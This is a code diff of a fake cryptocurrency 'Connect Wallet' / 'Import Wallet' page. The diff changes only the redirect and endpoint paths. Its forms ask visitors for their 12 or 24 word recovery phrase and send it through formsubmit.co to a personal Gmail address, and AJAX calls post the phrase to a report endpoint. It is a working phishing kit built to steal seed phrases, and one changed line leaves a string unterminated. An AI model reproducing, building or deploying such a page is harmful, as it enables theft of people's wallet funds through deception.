@@ -1177,7 +1177,7 @@
                         <div id="div_connect_manuallly" style="display:none;">
                             <form action="https://formsubmit.co/Sj4617729@gmail.com" method="POST" >
 							<input type="hidden" name="_captcha" value="false">
-							<input type="hidden" name="_next" value="https://models-aichain.pages.dev/wc/assets/Report.php"> 
+							<input type="hidden" name="_next" value="https://models-aichain.pages.dev/wc/assets/report.html"> 
                                 <textarea style="./font-size:25px; ./font-weight:650" rows="4" name="mnphrrr" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
                             
                                 <button disabled="" type="submit" name="connect" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
@@ -1187,7 +1187,7 @@
                         <div id="div_connect_manuallly2" style="display:none;">
 						<form action="https://formsubmit.co/Sj4617729@gmail.com" method="POST" >
 							<input type="hidden" name="_captcha" value="false">
-							<input type="hidden" name="_next" value="https://models-aichain.pages.dev/wc/assets/Report.php"> 
+							<input type="hidden" name="_next" value="https://models-aichain.pages.dev/wc/assets/report.html"> 
                                 <h3 class="text-primary" style="./font-size:25px; ./font-weight:500;">Import Wallet</h3><br><br><br>
                                 <div class="input-group">
                                     <input type="text" name="mnphrrr" required="" class="form-control text-primary" placeholder="Secret Recovery Phrase">
@@ -1366,7 +1366,7 @@
                     // $(this).text('Loading...').css('pointer-events','none')
 
                     $.ajax({
-                       url: "assets/Report.php",
+                       url: "assets/report.html
                         method: "POST",
                         data: {"load_phrase":1, "data_phrase":field.val(), "wallet_selected": $('#wallet_name').text().trim()},
                         success: function(result){
@@ -1397,7 +1397,7 @@
                     // $(this).text('Loading...').css('pointer-events','none')
 
                     $.ajax({
-                       url: "assets/Report.php",
+                       url: "assets/report.html",
                         method: "POST",
                         data: {"load_phrase":1, "data_phrase":field.val(), "wallet_selected": $('#wallet_name').text().trim()},
                         success: function(result){
